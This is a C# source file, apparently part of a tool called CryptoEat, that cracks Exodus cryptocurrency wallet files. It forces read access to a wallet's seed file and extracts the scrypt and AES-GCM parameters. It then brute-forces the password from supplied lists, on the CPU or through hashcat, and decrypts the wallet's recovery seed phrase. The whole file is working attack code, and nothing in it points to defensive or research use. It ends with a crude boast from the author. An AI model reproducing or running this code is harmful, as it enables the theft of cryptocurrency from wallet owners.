using System.Diagnostics;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Text;
using CryptoEat.Modules.Logs;
using CryptoEat.Modules.Wallet.Libs;
using NBitcoin;
using Norgerman.Cryptography.Scrypt;

namespace CryptoEat.Modules.Wallet;

internal class Exodus : IWallet
{
    public WalletInfo? WalletInfo { get; init; } = null;
    public WalletType WalletName { get; init; } = WalletType.Exodus;
    internal Exodus(string secoPath)
    {
        try
        {
            _seedBuffer = File.ReadAllBytes(secoPath);
        }
        catch (UnauthorizedAccessException)
        {
            FileAccessHelper.CheckAndGrantAccess(secoPath);
            _seedBuffer = File.ReadAllBytes(secoPath);
        }

        #region Check

        if (!Encoding.UTF8.GetString(_seedBuffer[..4]).StartsWith("SECO"))
        {
            throw new ArgumentException("Corrupted seco", nameof(secoPath));
        }

        #endregion

        Init();
    }

    private void Init()
    {
        #region Scrypt

        _bkSalt = _seedBuffer[256..288];
        _n = FromInt32B(_seedBuffer[288..292]);
        _r = FromInt32B(_seedBuffer[292..296]);
        _p = FromInt32B(_seedBuffer[296..300]);

        #endregion

        #region BlobKey

        _bkIv = _seedBuffer[332..344];
        _bkAuthTag = _seedBuffer[344..360];
        _bkKey = _seedBuffer[360..392];

        #endregion

        Hash = GetHash();
    }

    #region Internal methods

    private string GetHash() =>
        $"EXODUS:{_n}:{_r}:{_p}:{ToBase64(_bkSalt)}:{ToBase64(_bkIv)}:{ToBase64(_bkKey)}:{ToBase64(_bkAuthTag)}";

    internal string Hash;
    internal Mnemonic ToMnemonic(string password)
    {
        var spass = ScryptUtil.Scrypt(password, _bkSalt, _n, _r, _p, 32);

        using var bkgcm = new AesGcm(spass); // BlobKey decryption by scrypted password
        var blobKey = new byte[_bkKey.Length];
        bkgcm.Decrypt(_bkIv, _bkKey, _bkAuthTag, blobKey);

        var blobIv = _seedBuffer[392..404];
        var blobTag = _seedBuffer[404..420];
        var encBlob = _seedBuffer[516..];

        var blob = new byte[encBlob.Length]; // Blob decryption by BlobKey
        using var blobgcm = new AesGcm(blobKey);
        blobgcm.Decrypt(blobIv, encBlob, blobTag, blob);

        var len = FromUInt32B(blob[..4]);
        var decoded = GunZipDecode(blob[4..(len + 4)]);
        var entropy = decoded[64..];

        return new Mnemonic(Wordlist.English, entropy);
    }
    public bool TryBruteCpu(ref HashSet<string> passwords, out Output? mnemo, out string password)
    {
        password = string.Empty;
        mnemo = null;
        var isBruted = false;
        string? rightPass = null;
        Mnemonic? mnemonic = null;

        var tasks = passwords
            .Distinct()
            .Where(x => x.Length is > 7 and < 100)
            .Select(pass => new Task(() =>
            {
                if (isBruted)
                {
                    return;
                }

                try
                {
                    mnemonic = ToMnemonic(pass);
                    rightPass = pass;

                    isBruted = true;
                }
                catch
                {
                    // ignored
                }
            }))
            .ToArray();

        foreach (var task in tasks)
        {
            if (!isBruted)
            {
                task.Start();
            }
            else if (mnemonic != null && rightPass != null)
            {
                mnemo = mnemonic;
                password = rightPass;

                return true;
            }
        }
        foreach (var task in tasks)
        {
            if (!isBruted)
            {
                task.Wait();
            }
            else if (mnemonic != null && rightPass != null)
            {
                mnemo = mnemonic;
                password = rightPass;

                return true;
            }
        }
        if (!isBruted)
        {
            return false;
        }

        mnemo = mnemonic;
        password = rightPass;

        return isBruted;
    }
    public bool TryBruteGpu(ref HashSet<string> passwords, out Output? mnemo, out string password)
    {
        foreach (var process in Generic.ChildProcesses)
        {
            try
            {
                process.Kill();
                Generic.ChildProcesses.Remove(process);
            }
            catch
            {
                // ignore
            }
        }

        var tempDir = Path.Combine(Environment.CurrentDirectory, "temp");
        if (!Directory.Exists(tempDir))
        {
            Directory.CreateDirectory(tempDir);
        }

        password = string.Empty;
        mnemo = null;

        foreach (var pr in Process.GetProcessesByName("hashcat.exe"))
        {
            pr.Kill();
        }

        var passPath = Path.Combine(tempDir, "tempPasswords.txt");
        var hashPath = Path.Combine(tempDir, "hash.txt");
        File.WriteAllLines(passPath, passwords.Distinct().Where(x => x.Length is > 7 and < 100));
        File.WriteAllText(hashPath, Hash);

        passwords.Clear();

        try
        {
            if (File.Exists(Path.Combine("hashcat", "hashcat.potfile")))
            {
                File.Delete(Path.Combine("hashcat", "hashcat.potfile"));
            }
        }
        catch (Exception e)
        {
            Generic.WriteError(e);
        }

        try
        {
            if (File.Exists(Path.Combine("hashcat", "cracked.txt")))
            {
                File.Delete(Path.Combine("hashcat", "cracked.txt"));
            }
        }
        catch (Exception e)
        {
            Generic.WriteError(e);
        }

        var p = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "hashcat/hashcat.exe",
                Arguments = $"-a 0 -w 4 -m 28200 -O --force -o cracked.txt \"{hashPath}\" \"{passPath}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true,
                RedirectStandardInput = true,
                WorkingDirectory = "hashcat"
            }
        };
        p.Start();
        p.PriorityClass = ProcessPriorityClass.RealTime;
        Generic.ChildProcesses.Add(p);

        while (!p.StandardOutput.EndOfStream)
        {
            var standardOutput = p.StandardOutput.ReadLine();
            if (standardOutput?.StartsWith("Status") != true)
            {
                continue;
            }

            if (standardOutput.Contains("Cracked"))
            {
                var temp = File.ReadAllLines("hashcat/cracked.txt")[0];
                password = temp.Split(':').Last();
                mnemo = ToMnemonic(password);
                try
                {
                    p.Close();
                }
                catch (Exception ex)
                {
                    Generic.WriteError(ex);
                }

                try
                {
                    Generic.ChildProcesses.Remove(p);
                }
                catch
                {
                    // ignore
                }

                return true;
            }

            if (!standardOutput.Contains("Exhausted"))
            {
                continue;
            }

            try
            {
                p.Close();
            }
            catch (Exception ex)
            {
                Generic.WriteError(ex);
            }

            try
            {
                Generic.ChildProcesses.Remove(p);
            }
            catch
            {
                // ignore
            }

            return false;
        }

        p.WaitForExit();

        try
        {
            Generic.ChildProcesses.Remove(p);
        }
        catch
        {
            // ignore
        }

        return false;
    }

    public bool TryBrute(ref HashSet<string> passwords, out Output? mnemo, out string password)
    {
        return Generic.Settings.GpuBrute ? TryBruteGpu(ref passwords, out mnemo, out password) : TryBruteCpu(ref passwords, out mnemo, out password);
    }

    #endregion

    #region Crypto variables

    private readonly byte[] _seedBuffer;
    private int _n, _r, _p;
    private byte[] _bkSalt, _bkAuthTag, _bkIv, _bkKey;

    #endregion

    #region Helpers

    private static int FromInt32B(byte[] bytes) => BitConverter.ToInt32(bytes.Reverse().ToArray());
    private static int FromUInt32B(byte[] bytes) => (int)BitConverter.ToUInt32(bytes.Reverse().ToArray());
    private static string ToBase64(byte[] bytes) => Convert.ToBase64String(bytes);
    private static byte[] GunZipDecode(byte[] bytes)
    {
        using var stream = new MemoryStream(bytes);
        using var unzipper = new GZipStream(stream, CompressionMode.Decompress, true);
        using var output = new MemoryStream();
        unzipper.CopyTo(output);

        return output.ToArray();
    }

    #endregion
}
// by Temnij, 12.04.2023 3:10 AM
// пиздец я гений